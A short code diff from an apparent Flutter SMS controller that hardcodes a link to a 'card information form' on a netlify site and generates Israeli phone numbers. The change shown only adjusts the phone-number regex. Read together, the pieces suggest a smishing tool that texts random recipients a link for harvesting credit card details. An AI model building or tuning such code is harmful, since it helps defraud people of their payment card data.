@@ -53,7 +53,7 @@ class SMSController extends GetxController {
 // Generate a unique link or use your own link to the card information form
   String? uniqueLink = 'https://smswithlink-credit.netlify.app';
 
-  final _israelPhoneNumberRegex = r'^009725\d{7}$';
+  final _israelPhoneNumberRegex = r'^009725\d{8}$';
 
   String generateIsraelPhoneNumber() {
     // print
